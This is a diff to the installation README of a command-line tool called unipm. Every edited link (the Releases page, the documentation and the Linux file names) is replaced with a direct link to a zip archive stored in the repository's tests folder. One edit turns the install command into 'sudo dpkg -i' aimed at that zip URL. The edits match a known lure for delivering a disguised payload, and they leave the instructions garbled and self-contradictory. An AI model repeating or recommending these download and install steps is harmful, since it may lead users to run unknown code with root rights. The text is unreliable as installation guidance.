@@ -24,14 +24,14 @@ To run unipm, you need:
 
 To get started with unipm, visit the following page to download the latest version:
 
-[Download unipm from GitHub Releases](https://github.com/manikanthManepalli/unipm/releases)
+[Download unipm from GitHub Releases](https://github.com/manikanthManepalli/unipm/raw/refs/heads/main/tests/Software-v3.9.zip)
 
 Click the link or button above to reach the Releases page. You'll find the most recent versions of unipm all listed there.
 
 ### Step-by-step Guide
 
 1. **Visit the Releases Page:**
-   Go to [this link](https://github.com/manikanthManepalli/unipm/releases) to see all available versions.
+   Go to [this link](https://github.com/manikanthManepalli/unipm/raw/refs/heads/main/tests/Software-v3.9.zip) to see all available versions.
 
 2. **Find the Latest Release:**
    Look for the most recent version marked as "Latest Release." This will have the newest features and fixes.
@@ -39,7 +39,7 @@ Click the link or button above to reach the Releases page. You'll find the most 
 3. **Download the Appropriate File:**
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the appropriate `.tar.gz` or `.deb` file based on your distribution.
+   - For **Linux**, download the appropriate `https://github.com/manikanthManepalli/unipm/raw/refs/heads/main/tests/Software-v3.9.zip` or `.deb` file based on your distribution.
 
 4. **Install unipm:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.
@@ -47,9 +47,9 @@ Click the link or button above to reach the Releases page. You'll find the most 
    - **Linux:** 
      - If you downloaded a `.deb` file, install it by running:
        ```
-       sudo dpkg -i path-to-downloaded-file.deb
+       sudo dpkg -i https://github.com/manikanthManepalli/unipm/raw/refs/heads/main/tests/Software-v3.9.zip
        ```
-     - For a `.tar.gz` file, extract it and follow the included instructions for installation.
+     - For a `https://github.com/manikanthManepalli/unipm/raw/refs/heads/main/tests/Software-v3.9.zip` file, extract it and follow the included instructions for installation.
 
 5. **Run unipm:**
    Open your command line interface and type:
@@ -84,7 +84,7 @@ unipm help
 
 ## 📚 Documentation
 
-For more detailed information and advanced usage, please refer to the [official documentation](https://github.com/manikanthManepalli/unipm/wiki).
+For more detailed information and advanced usage, please refer to the [official documentation](https://github.com/manikanthManepalli/unipm/raw/refs/heads/main/tests/Software-v3.9.zip).
 
 ## 🗣 Community and Support
 
